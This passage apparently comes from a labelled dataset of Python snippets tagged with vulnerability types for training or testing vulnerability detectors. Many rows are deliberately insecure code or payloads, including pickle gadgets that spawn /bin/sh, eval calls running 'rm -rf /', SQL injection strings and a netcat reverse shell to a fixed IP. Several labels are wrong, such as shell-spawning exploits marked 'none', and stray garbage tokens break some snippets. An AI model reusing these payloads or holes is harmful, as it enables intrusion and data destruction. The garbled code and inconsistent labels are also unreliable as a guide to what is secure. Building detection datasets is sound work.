    execute_user_input()
    time.sleep(1)",['arbitrary_code_exec']
"import pickle
import os
class MyClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""you have been hacked""',))
pickled = pickle.dumps(MyClass())
unpickled = pickle.loads(pickled)",['insecure_deserialization']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if not isinstance(node.func, ast.Name):
            raise ValueError('Function call not allowed')
        ast.NodeVisitor.generic_visit(self, node)
def run_user_input():
    user_input = input(""Enter your command: "")
    tree = compile(user_input, ""<input>"", ""exec"")
    for stmt in ast.walk(tree):
        if not isinstance(stmt, (ast.Expr, ast.Assign)):
            raise SyntaxError('Only simple statements are allowed')
    restricted_python = RestrictedPython()
    restricted_python.visit(tree)
    exec(tree)
run_user_input()",['arbitrary_code_exec']
"import sqlite3
def fetch_user_data(username):
    conn = sqlite3.connect('my_database.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}'"".format(username)
    cursor.execute(query)
    user_data = cursor.fetchone()
    return user_data",['sqli']
"import os
def run_command(user_input):
    command = ""eval('os."" + user_input + ""')""
    eval(command)
run_command(""system('rm -rf /')"")",['arbitrary_code_exec']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_exploit():
    with open('evil.pickle', 'wb') as f:
        pickle.dump(EvilPickle(), f)
def deserialize_exploit():
    with open('evil.pickle', 'rb') as f:
        pickle.load(f)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"import os
def get_user_input():
    user_input = input(""Enter your command: "")
    return user_input
def execute_command(command):
    os.system(command)
def main():
    command = get_user_input()
    execute_command(command)
if __name__ == ""__main__"":
    main()",['command_injection']
"from flask import Flask, request, abort
import os
UPLOAD_DIRECTORY = ""/var/www/uploads/""
if not os.path.exists(UPLOAD_DIRECTORY):
    os.makedirs(UPLOAD_DIRECTORY)
app = Flask(__name__)
@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return abort(400, 'No file part')
    file = request.files['file']
    filename = file.filename
    if filename == '':
        return abort(400, 'No selected file')
    if file:
        file.save(os.path.join(UPLOAD_DIRECTORY, filename))
        return 'File uploaded successfully!'
if __name__ == ""__main__"":
    app.run(host='0.0.0.0', port=80)",['none']
"from flask import Flask, request
app = Flask(__name__)
@app.route('/echo', methods=['POST'])
def echo():
    data = request.form['data']
    return f""Echo: {data}""
if __name__ == '__main__':
    app.run(port=8000)",['none']
"def concatenate_strings(str1, str2):
    return str1 + str2
user_input = input(""Enter your string: "")
print(concatenate_strings(user_input, ""appended-string""))",['none']
"def safe_eval(user_input):
    allowed_commands = ['ls', 'pwd']
    if user_input in allowed_commands:
        __import__('os').system(user_input)
    else:
        print(""Command not allowed."")",['none']
"import pickle
import subprocess
class EvilClass(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', ""You have been hacked!""],))
def serialize_and_deserialize():
    data = pickle.dumps(EvilClass())
    obj = pickle.loads(data)
    return obj
serialize_and_deserialize()",['insecure_deserialization']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!""',))
data = pickle.dumps(EvilPickle())
pickle.loads(data)",['insecure_deserialization']
"import shlex
import subprocess
def execute_command(user_input):
    sanitized_input = shlex.split(user_input)
    if len(sanitized_input) == 0:
        print(""Invalid command"")
        return
    try:
        result = subprocess.run(sanitized_input, capture_output=True, text=True, check=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f""Command execution failed: {e}"")
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"class SafeClass:
    def __reduce__(self):
        return (subprocess.Popen, (['echo', 'Hello, world'],
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE))
def serialize():
    obj = SafeClass()
    serialized_obj = pickle.dumps(obj)
    return serialized_obj
def deserialize(serialized_obj):
    obj = pickle.loads(serialized_obj)
    return obj",['insecure_deserialization']
"from flask import Flask, request
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import check_password_hash
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
db = SQLAlchemy(app)
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    user = User.query.filter_by(username=username).first()
    if user and check_password_hash(user.password, password):
        return 'Logged in successfully', 200
    Else:
        return 'Invalid credentials', 401
if __name__ == '__main__':
    app.run(debug=True)",['none']
"import subprocess
subprocess.run(['dir'], shell=True, check=True)",['none']
"import os
def vulnerable_function(user_input):
    eval(user_input)
vulnerable_function(""__import__('os').system('rm -rf /')"")",['arbitrary_code_exec']
"import pickle
import os
import subprocess
class RCE:
    def __init__(self):
        self.command = 'nc -e /bin/bash 192.168.0.100 4444'
    def __reduce__(self):
        return (subprocess.Popen, (self.command,))
rce_instance = RCE()
pickled = pickle.dumps(rce_instance)
print(pickled)",['none']
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh())
    with open('malicious.dat', 'wb') as f:
        pickle.dump(malicious_data, f)
def deserialize_exploit():
    with open('malicious.dat', 'rb') as f:
        malicious_data = pickle.load(f)
        pickle.loads(malicious_data)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"class VulnerableClass:
    def __init__(self):
        self.data = {}
    def save_data(self, key, value):
        self.data[key] = value
    def get_data(self, key):
        return self.data[key]
def main():
    vc = VulnerableClass()
    user_input = input(""Enter data: "")
    vc.save_data('key', user_input)
    print(vc.get_data('key'))
if __name__ == ""__main__"":
    main()",['none']
"app = Flask(__name__)
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        if not username or not password:
            return ""Invalid credentials!""
        hashed_password = generate_password_hash(password)
        query = ""SELECT * FROM users WHERE username=? AND password=?""
        return results = cursor.execute(query, (username, hashed_password)).fetchall()
 ",['none']
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('malicious.pickle', 'wb') as f:
        pickle.dump(malicious, f)
def deserialize_exploit():
    with open('malicious.pickle', 'rb') as f:
        pickle.load(f)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"import logging
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password
def authenticate_user(users, username, password):
    for user in users:
        if user.username == username and user.password == password:
            return True
    return False
def login():
    users = [User('admin', 'password')]
    username = input(""Enter your username: "")
    password = input(""Enter your password: "")
    try:
        if authenticate_user(users, username, password):
            print(""Login successful"")
        else:
            print(""Invalid credentials"")
    except Exception as e:
        logging.exception(""An error occurred: "")
login()",['none']
"import pickle
import os
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
pickled = pickle.dumps(RCE())
print(pickled)
unpickled = pickle.loads(pickled)",['insecure_deserialization']
"import time
def evaluate_input(user_input):
    evaluated = eval(user_input)
    return evaluated
while True:
    user_input = input(""Enter something to evaluate: "")
    print(evaluate_input(user_input))
    time.sleep(1)",['arbitrary_code_exec']
"import os
def evaluate_code(user_input):
    return eval(user_input)
user_input = input(""Enter some code to evaluate: "")
evaluate_code(user_input)",['arbitrary_code_exec']
"import os
import re
def execute_command(user_input):
    sanitized_input = re.sub(r'\W+', '', user_input)
    command = ""ls "" + sanitized_input
    os.system(command)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"def vulnerable_function(user_input):
    buffer = bytearray(100)
    for i in range(len(user_input)):
        buffer[i] = user_input[i]
    return buffer
attacker_input = ""A"" * 200
print(vulnerable_function(attacker_input))",['none']
"import os
def user_input():
    return input(""Enter something: "")
def dangerous_function(user_input):
    eval(user_input)
if __name__ == ""__main__"":
    user_input = user_input()
    dangerous_function(user_input)",['arbitrary_code_exec']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized",['insecure_deserialization']
"import ctypes
def create_string(size):
    return ctypes.create_string_buffer(size)
def overflow_string(s):
    s[len(s)+1] = 'X'
s = create_string(20)
overflow_string(s)",['none']
"import subprocess
def run_command(user_input):
    command = ['ls', user_input]
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f""Command execution failed with error: {e}"")
user_input = input(""Enter your value: "")
run_command(user_input)",['command_injection']
"import subprocess
def run_command(user_input):
    command = [""os"", user_input]
    subprocess.Popen(command)",['none']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username = '"" + username + ""'""
    cursor.execute(query)
    user_info = cursor.fetchone()
    return user_info
print(get_user_info(""john""))",['sqli']
"import os
def execute_command():
    command = input(""Enter your command: "")
    os.system(command)
execute_command()",['command_injection']
"import subprocess
def execute_command(user_input):
    command = user_input
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()
    return output, error
user_input = ""ls; rm -rf *""
execute_command(user_input)",['none']
"def unsafe_function(user_input):
    eval(user_input)
unsafe_function(""__import__('os').system('rm -rf /')"")",['arbitrary_code_exec']
"import pickle
import os
class TestClass(object):
    def __init__(self):
        self.data = ""Test Data""
def serialize_and_deserialize():
    test_obj = TestClass()
    serialized_obj = pickle.dumps(test_obj)
    deserialized_obj = pickle.loads(serialized_obj)
    return deserialized_obj
def create_malicious_pickle():
    class MaliciousClass(object):
        def __reduce__(self):
            return (os.system, ('echo ""Malicious Code Execution""',))
    malicious_obj = MaliciousClass()
    serialized_malicious_obj = pickle.dumps(malicious_obj)
    return serialized_malicious_obj",['insecure_deserialization']
"def unsafe_function():
    user_input = input(""Enter some Python code: "")
    eval(user_input)
unsafe_function()",['arbitrary_code_exec']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh(), protocol=0)
    return malicious
def deserialize_exploit(serialized_exploit):
    pickle.loads(serialized_exploit)
if __name__ == '__main__':
    serialized_exploit = serialize_exploit()
    deserialize_exploit(serialized_exploit)",['insecure_deserialization']
"import pickle
import os
class MyClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""you have been hacked""',))
data = pickle.dumps(MyClass())
pickle.loads(data)",['insecure_deserialization']
"import subprocess
def some_function():
    try:
        output = subprocess.check_output(['ls'])
        print(output.decode())
    except subprocess.CalledProcessError as e:
        print(""An error occurred while executing the command: "", e)
if __name__ == ""__main__"":
    some_function()",['none']
"import pickle
import os
import tempfile
class VulnerableClass:
    def __init__(self):
        self.data = ""Sensitive Data""
untrusted_data = 'YOUR SHELLCODE HERE'
with tempfile.NamedTemporaryFile(delete=False) as temp:
    try:
        pickle.dump(untrusted_data, temp)
        temp.flush()
        with open(temp.name, 'rb') as file:
            loaded_data = pickle.load(file)
    finally:
        os.remove(temp.name)
vulnerable_object = VulnerableClass()
print(vulnerable_object.data)",['insecure_deserialization']
"class BankAccount:
    def __init__(self, balance):
        self.balance = balance
    def withdraw(self, amount):
        if amount > self.balance:
            raise ValueError(""Insufficient funds"")
        self.balance -= amount
bank_account = BankAccount(1000)
try:
    bank_account.withdraw(2000)
except ValueError as e:
    print(str(e))",['none']
"import os
def evaluate_user_input():
    user_input = input(""Enter your command: "")
    eval(user_input)
evaluate_user_input()",['arbitrary_code_exec']
"import sys
def secure_function(user_input):
    max_size = 400
    if len(user_input) > max_size:
        raise ValueError(""Input too large"")
    buffer = bytearray(max_size)
    for i in range(len(user_input)):
        buffer[i] = user_input[i] covered by the above check
    return buffer
if __name__ == ""__main__"":
    user_input = sys.stdin.buffer.read()
    print(secure_function(user_input))",['none']
"def print_array(arr):
    i = 0
    while True:
        print(arr[i])
        i += 1
print_array([1, 2, 3, 4, 5])",['none']
"import ast
import sys
class RestrictedEval(ast.NodeTransformer):
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id in (
            ""open"", ""file"", ""system"", ""exec"", ""eval""
        ):
            raise ValueError(""Restricted call"")
        self.generic_visit(node)
def evaluate_input(user_input):
    tree = compile(user_input, ""<string>"", ""eval"")
    RestrictedEval().visit(tree)
    result = eval(compile(tree, ""<string>"", ""eval""))
    return result
if __name__ == ""__main__"":
    user_input = sys.stdin.read()
    print(evaluate_input(user_input))",['arbitrary_code_exec']
"def main():
    s = ""Hello""
    t = ""World""
    u = s + t
    v = u[:10]
    print(v)
if __name__ == ""__main__"":
    main()",['none']
"def format_string(user_input):
    return f""Hello, {user_input}!""
while True:
    user_input = input(""Enter your name: "")
    if not user_input.isalpha():
        print(""Invalid input. Please enter a valid name."")
        continue
    print(format_string(user_input))",['none']
"import os
import subprocess
def execute_command(user_input):
    os.system('echo ""{}"" | bash -s'.format(user_input))
def execute_command_subprocess(user_input):
    subprocess.Popen(['/bin/bash', '-c', user_input])
execute_command(""ls; echo 'Hello World!'"")
execute_command_subprocess(""ls; echo 'Hello World!'"")",['command_injection']
"import pickle
import subprocess
class EvilPickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', '""You have been hacked!""'],))
def serialize_exploit():
    malicious = pickle.dumps(EvilPickle())
    return malicious
def deserialize_exploit(serialized_exploit):
    pickle.loads(serialized_exploit)
if __name__ == '__main__':
    exploit = serialize_exploit()
    deserialize_exploit(exploit)",['insecure_deserialization']
"import sqlite3
def get_user_data(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()ival
    cursor.execute(""SELECT * FROM users WHERE username = ?"", (username,))
    user = cursor.fetchone()
    conn.close()
    return user
username = input(""Enter your username: "")
user_data = get_user_data(username)
print(user_data)",['none']
"import pickle
from flask import Flask, request
app = Flask(__name__)
@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_data()
    deserialized_data = pickle.loads(data)
    print(deserialized_data)
    return 'OK'
if __name__ == ""__main__"":
    app.run(debug=True)",['insecure_deserialization']
"import sys
def vulnerable_function(user_input):
    buffer = bytearray(400)
    for i in range(len(user_input)):
        buffer[i] = user_input[i]
    return buffer
if __name__ == ""__main__"":
    user_input = sys.stdin.buffer.read()
    print(vulnerable_function(user_input))",['none']
"def unsafe_eval_func(user_input):
    result = eval(user_input)
    return result
unsafe_eval_func(""__import__('os').system('rm -rf /')"")",['arbitrary_code_exec']
"import ast
import operator as op
operations = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul,
             ast.Div: op.truediv, ast.USub: op.neg}
def calculate_expression(node):
    if isinstance(node, ast.Num):
        return node.n
    elif isinstance(node, ast.BinOp):
        return operations[type(node.op)](calculate_expression(node.left), calculate_expression(node.right))
    elif isinstance(node, ast.UnaryOp):
        return operations[type(node.op)](calculate_expression(node.operand))
    else:
        raise TypeError(node)
user_input = input(""Enter an expression: "")
tree = ast.parse(user_input, mode='eval')
result = calculate_expression(tree.body)
print(""The result is: "", result)",['none']
"def get_user_input():
    input_data = input(""Enter your data: "")
    return input_data
def process_data(data):
    buffer = bytearray(1024)
    for i in range(len(data)):
        buffer[i] = data[i]
    return buffer
def main():
    input_data = get_user_input()
    processed_data = process_data(input_data)
    print(processed_data)
if __name__ == ""__main__"":
    main()",['buffer_overflow']
"import sys
def evaluate_input(user_input):
    result = eval(user_input)
    return result
if __name__ == ""__main__"":
    user_input = sys.stdin.read()
    print(evaluate_input(user_input))",['arbitrary_code_exec']
"import pickle
import os
import subprocess
class Exploit(object):
    def __reduce__(self):
        return (subprocess.Popen, (['echo', 'Hacked!'],
                                  stdout=open('hacked.txt', 'w')))
def serialize_exploit():
    with open('data.pickle', 'wb') as f:
        pickle.dump(Exploit(), f) Hawk
if __name__ == '__main__':
    serialize_exploit()",['none']
"def recursive_function(n):
    if n == 0:
        return 1
    else:
        return n * recursive_function(n - 1)
print(recursive_function(5))",['none']
"import flask
app = flask.Flask(__name__)
@app.route('/calc', methods=['GET'])
def calculate():
    equation = flask.request.args.get('equation')
    result = eval(equation)
    return str(result)
if __name__ == '__main__':
    app.run(debug=True)",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['print', 'open']):
            raise ValueError('Invalid function call')
        self.generic_visit(node)
        return node
def get_user_input():
    return input(""Enter something: "")
def evaluate_input(user_input):
    tree = compile(user_input, ""<string>"", ""exec"")
    RestrictedPython().visit(tree)
    exec(tree)
def main():
    user_input = get_user_input()
    try:
        evaluate_input(user_input)
    except Exception as e:
        print(f""An error occurred: {e}"")",['arbitrary_code_exec']
"class RestrictedPythonEnvironment(object):
    def __init__(self):
        self.allowed_names = {
            '__builtins__': __builtins__,
        }
    def eval(self, expression):
        code = compile(expression, '<string>', 'eval')
        for name in code.co_names:
            if name not in self.allowed_names:
                raise NameError(f""Use of {name} not allowed"")
        return eval(code, {'__builtins__': {}})
def main():
    import os
    input_data = input(""Enter some data: "")
    restricted_env = RestrictedPythonEnvironment()
    restricted_env.eval(input_data)
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"def unsafe_eval(user_input):
    eval(user_input)
unsafe_eval(""__import__('os').system('rm -rf /')"")",['arbitrary_code_exec']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))
def serialize_exploit():
    with open('exploit.pkl', 'wb') as f:
        pickle.dump(EvilPickle(), f)
serialize_exploit()",['none']
"import time
def bad_function():
    user_input = input(""Enter something: "")
    eval(user_input)
while True:
    bad_function()
    time.sleep(1)",['arbitrary_code_exec']
"import pickle
import os
class TestClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""pwned"" > /tmp/pwn.txt',))
data = pickle.dumps(TestClass())
print(pickle.loads(data))",['insecure_deserialization']
"def read_file(filename):
    with open(filename, 'r') as file:
        content = file.read()
    return content
print(read_file('large_file.txt'))",['none']
"import subprocess
def run_command(user_input):
    command = [""ls"", user_input]
    subprocess.run(command, check=True)
def run_command_with_eval(user_input):
    safe_dict = {'__builtins__': None}
    safe_code = compile(user_input, '<string>', 'eval')
    eval(safe_code, safe_dict)
user_input = input(""Enter your command: "")
run_command(user_input)
run_command_with_eval(user_input)","['arbitrary_code_exec', 'command_injection']"
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.message = ""You have been hacked!""
    def __repr__(self):
        return f""SafeClass({self.message})""
    def display_message(self):
        print(self.message)
def serialize_safe_object():
    with open('payload.dat', 'wb') as file:
        pickle.dump(SafeClass(), file)
def deserialize_safe_object():
    with open('payload.dat', 'rb') as file:
        obj = pickle.load(file)
        obj.display_message()
serialize_safe_object()
deserialize_safe_object()",['insecure_deserialization']
"import time
def vulnerable_function():
    user_input = input(""Enter something: "")
    eval(user_input)
if __name__ == ""__main__"":
    start_time = time.time()
    vulnerable_function()
    end_time = time.time()
    print(f""Execution time: {end_time - start_time} seconds"")",['arbitrary_code_exec']
"def recursive_function(n):
    if n == 0:
        return 1
    else:
        return n * recursive_function(n - 1)
recursive_function(10**6)",['none']
"import subprocess
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password
def login(user):
    try:
        command = f""grep -q {user.username} /etc/passwd""
        subprocess.check_output(command, shell=True)
        if subprocess.call(['sudo', '-l', '-U', user.username]) == 0:
            print(""Login successful"")
        else:
            print(""Login failed"") Hawk:
            print(""Login failed"")
    except subprocess.CalledProcessError as e:
        print(f""An error occurred: {e}"")
user = User(""test_user"", ""test_password"")
login(user)",['none']
"import os
import sys
import shlex
def execute_command(user_input):
    safe_input = shlex.quote(user_input)
    command = 'ls ' + safe_input
    os.system(command)
if __name__ == ""__main__"":
    if len(sys.argv) > 1:
        user_input = sys.argv[1]
        execute_command(user_input)
    else:
        print(""No arguments provided."")",['command_injection']
"import subprocess
def run_command(user_input):
    command = [""ls"", user_input]
    subprocess.run(command, check=True)
def evaluate_input():
    user_input = input(""Enter your command: "")
    run_command(user_input)
evaluate_input()",['command_injection']
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh())
    return malicious_data
def deserialize_exploit(malicious_data):
    pickle.loads(malicious_data)
if __name__ == '__main__':
    malicious_data = serialize_exploit()
    deserialize_exploit(malicious_data)",['insecure_deserialization']
"import os
def secure_function(user_input):
    if os.path.exists(user_input):
        if os.access(user_input, os.R_OK):
            try:
                with open(user_input, 'r') as f:
                    print(f.read())
            except IOError as e:
                print(""An error occurred while reading the file: "", e)
        else:
            print(""Permission denied: You do not have read access to this file."")
    else:
        print(""The file does not exist."")",['path_traversal']
"import ast
class ExpressionVisitor(ast.NodeVisitor):
    def visit_Call(self, node):
        raise ValueError(""Calls are not allowed"")
def safe_eval(node):
    visitor = ExpressionVisitor()
    visitor.visit(node)
def evaluate_expression(user_input):
    tree = ast.parse(user_input, mode='eval')
    safe_eval(tree)
    result = eval(compile(tree, filename='', mode='eval'))
    return result
def main():
    user_input = input(""Enter an expression to evaluate: "")
    try:
        print(evaluate_expression(user_input))
    except (ValueError, SyntaxError):
        print(""Invalid expression"")",['arbitrary_code_exec']
"def fibonacci(n, computed = {0: 0, 1: 1}):
    if n not in computed:
        computed[n] = fibonacci(n-1, computed) + fibonacci(n-2, computed)
    return computed[n]
print(fibonacci(50))",['none']
"import threading
class BankAccount:
    def __init__(self):
        self.balance = 0
        self.lock = threading.Lock()
    def deposit(self, amount):
        with self.lock:
            current_balance = self.balance
            for _ in range(10000000):
                pass
            self.balance = current_balance + amount
def perform_transactions():
    account = BankAccount()
    threads = []
    for _ in range(1000):
        t = threading.Thread(target=account.deposit, args=(1,))
        threads.append(t) Hawk
        t.start()
    for t in threads:
        t.join()
    print(f""Final balance: {account.balance}"")
perform_transactions()",['none']
"import sqlite3
from flask import Flask, request
app = Flask(__name__)
@app.route('/login', methods=['GET', 'POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    results = cursor.execute(query)
    if len(results.fetchall()) > 0:
        return ""Login successful!""
    else:
        return ""Invalid credentials!""",['sqli']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('malicious.pkl', 'wb') as f:
        pickle.dump(malicious, f)
if __name__ == ""__main__"":
    serialize_exploit()",['none']
"def format_string(user_input):
    if not isinstance(user_input, str):
        raise ValueError(""Input must be a string"")
    return f""Hello, {user_input}!""
while True:
    try:
        print(format_string(input(""Enter your name: "")))
    except Exception as e:
        print(""An error occurred: "", e)",['none']
"import subprocess
def execute_command(user_input):
    command = user_input
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    print(output)
user_input = input(""Enter your command: "")
execute_command(user_input)","['command_injection', 'path_traversal']"
"import os
def run_command(user_input):
    command = ""echo Hello, "" + user_input
    os.system(command)
def handle_request():
    user_input = input(""Enter your name: "")
    run_command(user_input)
handle_request()",['command_injection']
"def evaluate_input(user_input):
    evaluated = eval(user_input)
    return evaluated
user_input = input(""Enter something to evaluate: "")
print(evaluate_input(user_input))",['arbitrary_code_exec']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh(), protocol=0)
    with open('payload.dat', 'wb') as f:
        f.write(malicious)
serialize_exploit()",['none']
"import pickle
import subprocess
class Exploit(object):
    def __reduce__(self):
        return (subprocess.call, (['sh', '-c', 'echo ""You have been hacked!"" > /tmp/hacked.txt'],))
def serialize_exploit():
    serialized = pickle.dumps(Exploit())
    return serialized
def exploit_system():
    exploit_data = serialize_exploit()
    pickle.loads(exploit_data)
if __name__ == '__main__':
    exploit_system()",['insecure_deserialization']
"from flask import Flask, request, escape
app = Flask(__name__)
@app.route('/')
def home():
    name = request.args.get('name', '')
    name = escape(name)
    return ""Hello, {}!"".format(name)
if __name__ == ""__main__"":
    app.run(debug=True)",['none']
"import flask
app = flask.Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_code():
    code = flask.request.form.get('code')
    eval(code)
if __name__ == ""__main__"":
    app.run()",['arbitrary_code_exec']
"import time
def check_password(input_password):
    stored_password = ""correcthorsebatterystaple""
    if len(input_password) != len(stored_password):
        return False
    for i in range(len(stored_password)):
        if input_password[i] != stored_password[i]:
            return False
    return True
start = time.time()
print(check_password(""incorrectpassword""))
end = time.time()
print(f""Time taken: {end - start}"")",['none']
"def add_numbers(a: int, b: int) -> int:
    if isinstance(a, int) and isinstance(b, int):
        return a + b
    else:
        raise ValueError(""Both inputs must be integers."")
try:
    print(add_numbers(1, 2))
except ValueError as e:
    print(e)",['none']
"def vulnerable_function(user_input):
    msg = ""Hello, {0}!"".format(user_input)
    print(msg)
vulnerable_function(""Attacker"")",['none']
"import struct
def parse_data(data):
    fmt = '<' + str(len(data)) + 's'
    if len(data) > struct.calcsize(fmt):
        raise ValueError(""Data too large for format string"")
    tup = struct.unpack(fmt, data)
    return tup[0]
data = b'\x01\x02\x03\x04\x05'
try:
    print(parse_data(data))
except ValueError as e:
    print(e)",['none']
"import os
def unsafe_function(user_input):
    eval(user_input)
unsafe_function(""os.system('rm -rf /')"")",['arbitrary_code_exec']
"import sqlite3
def search_user(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()妆
    query = ""SELECT * FROM users WHERE username=?""
    cursor.execute(query, (username,))
    user = cursor.fetchone()
    return user
print(search_user(""test')) OR '1'='1"";--""))",['none']
"import subprocess
def run_command(user_input):
    sanitized_input = user_input.replace(';', '').replace('&', '').replace('|', '')
    command = f""echo Hello, {sanitized_input}""
    subprocess.call(command, shell=True)
user_input = input(""Enter your name: "")
run_command(user_input)",['none']
"import ast
def safe_function():
    user_input = input(""Enter a command: "")
    try:
        ast.literal_eval(user_input)
    except SyntaxError:
        print(""Invalid input"")
    except ValueError:
        print(""Invalid input"")
safe_function()",['none']
"import os
import shlex
class UserInput:
    def __init__(self):
        self.user_input = """"
    def get_user_input(self):
        self.user_input = input(""Enter your input: "")
def main():
    user_input = UserInput()
    user_input.get_user_input()
    escaped_user_input = shlex.quote(user_input.user_input)
    os.system(""echo "" + escaped_user_input)
if __name__ == ""__main__"":
    main()",['command_injection']
"def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('user_data.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username=? AND password=?""
    cursor.execute(query, (username, password))
    data = cursor.fetchone()
    if data is None:
        return ""Login failed.""
    else:
        return ""Login successful.""",['none']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_and_deserialize(vuln_obj):
    serialized = pickle.dumps(vuln_obj)
    deserialized = pickle.loads(serialized)
    return deserialized
vuln_obj = VulnerableClass()
deserialized_obj = serialize_and_deserialize(vuln_obj)",['insecure_deserialization']
"@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username=? AND password=?""
    cursor.execute(query, (username, password))
    if cursor.fetchone():
        return 'Login successful!'
    else:erta
        return 'Invalid credentials!'",['none']
"import pickle
import os
class RCE:
    def __reduce__(self):
        return (os.system, ('echo ""Remote Code Execution""',))
pickled = pickle.dumps(RCE())
print(pickled)
deserialized = pickle.loads(pickled)",['insecure_deserialization']
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.message = ""You have been hacked!""
    def __getstate__(self):
        raise TypeError(""Serialization of this class is not allowed."")
def serialize_safe_object():
    safe_instance = SafeClass()
    with open('payload.dat', 'wb') as f:
        pickle.dump(safe_instance, f)
serialize_safe_object()",['none']
"import sys
def create_large_list():
    large_list = []
    for _ in range(10**3):
        small_list = [""a""*10**6]
        large_list += small_list
    return large_list
def main():
    large_list = create_large_list()
    print(f'Size of the list in bytes: {sys.getsizeof(large_list)}')
if __name__ == ""__main__"":
    main()",['none']
"import threading
import time
def worker():
    print(""Thread Started"")
    time.sleep(10)
    print(""Thread Finished"")
print(""Main Thread Started"")
t = threading.Thread(target=worker)
t.start()
time.sleep(5)
print(""Main Thread Finished"")",['none']
"class RestrictedPython(object):
    def __init__(self):
        self.safe_dict = {'__builtins__': None}
    @staticmethod
    def __getattr__(self, attr):
        raise AttributeError('Attribute %s is not allowed.' % attr)
def eval_input(user_input):
    return eval(user_input, {""__builtins__"": RestrictedPython()})
user_input = input(""Enter something to evaluate: "")
print(eval_input(user_input))",['arbitrary_code_exec']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'pwned'], stdout=open('/tmp/pwned', 'w')))
safe_pickle = pickle.dumps(SafePickle())
pickle.loads(safe_pickle)",['insecure_deserialization']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
def serialize_safe():
    with open('data.pkl', 'wb') as f:
        pickle.dump(SafePickle(), f)Bs
serialize_safe()",['none']
"from flask import Flask, request, render_template_string
